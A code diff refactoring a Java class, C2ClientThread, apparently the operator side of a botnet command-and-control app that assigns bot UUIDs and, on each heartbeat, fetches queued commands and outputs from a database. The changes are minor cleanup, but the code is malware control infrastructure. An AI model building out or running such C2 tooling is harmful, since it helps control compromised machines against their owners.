@@ -16,15 +16,14 @@ import java.util.Base64;
 import java.util.UUID;
 
 public class C2ClientThread extends Thread {
-    private Socket socket;
     private BufferedReader in;
     private PrintWriter out;
     private UUID uuid;
-    private CommandDatabase commandDatabase;
+    private final CommandDatabase commandDatabase;
 
     public C2ClientThread(Socket socket, CommandDatabase commandDatabase) {
         super("C2ClientThread");
-        this.socket = socket;
+
         this.commandDatabase = commandDatabase;
         try {
             this.in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
@@ -37,14 +36,12 @@ public class C2ClientThread extends Thread {
     @Override
     public void run() {
         while (true){
-            String str = null;
+            String str;
             try {
                 str = in.readLine();
-//                String[] line = str.split(" ");
                 if(str != null){
                     Log.i("received response from server", str);
                     switch (str) {
-                        // uuid: blah
                         case "set-uuid":
                             String uuidString = in.readLine();
                             Log.e("RECV UUID: ", uuidString);
@@ -60,7 +57,6 @@ public class C2ClientThread extends Thread {
                         case "heartbeat":
                             //str should be heartbeat
                             //if it is, fetch command from database
-                            //TODO: make the output scrollable please 🔜 🔜 🔜
                             ArrayList<String> cmds = commandDatabase.getFromDatabase(uuid.toString(), BotEntryContract.BotEntry.command);
                             String command = cmds.get(0);
                             ArrayList<String> outs = commandDatabase.getFromDatabase(uuid.toString(), BotEntryContract.BotEntry.output);
